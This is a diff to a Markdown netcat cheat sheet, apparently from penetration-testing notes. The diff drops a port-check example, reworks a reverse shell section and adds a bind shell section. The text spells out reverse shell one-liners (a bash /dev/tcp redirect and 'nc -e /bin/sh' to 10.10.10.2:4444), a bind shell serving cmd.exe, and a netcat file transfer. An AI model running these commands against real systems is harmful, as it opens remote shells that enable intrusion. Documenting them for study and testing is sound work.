@@ -72,15 +72,6 @@ nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
 
 ### Examples
 
-#### Check if port on target is open
-
-```plain
-$ nc -nv 10.10.10.1 25
-
-Connection to 10.10.10.1 25 port [tcp/*] succeeded!
-[...]
-```
-
 #### Create a Netcat listener
 
 This listener will listen on specific IP and port. IP can be removed if any interface is needed.
@@ -103,24 +94,38 @@ Sender
 nc -nv 10.10.10.2 4444 < /Downloads/wget.exe
 ```
 
-#### Reverse shell scenario
+### Reverse Shell
 
-Receiver
+**Receiver:**
 
 ```plain
 nc -nlvp 10.10.10.2 4444
 ```
 
-Target machine
+**Identity connecting and sending the reverse shell:**
 
 ```plain
 bash -i >& /dev/tcp/10.10.10.2/4444 0>&1
 ```
 
-OR target machine
+**OR identity connecting and sending the reverse shell:**
 
 ```plain
 nc 10.10.10.2 4444 -e /bin/sh
+```
+
+### Bind Shell
+
+**Receiver:**
+
+```plain
+nc -nlvp 4444 -e cmd.exe
+```
+
+**Identity connecting to bind shell::**
+
+```plain
+nc -nv <ip> 4444
 ```
 
 ### URL list
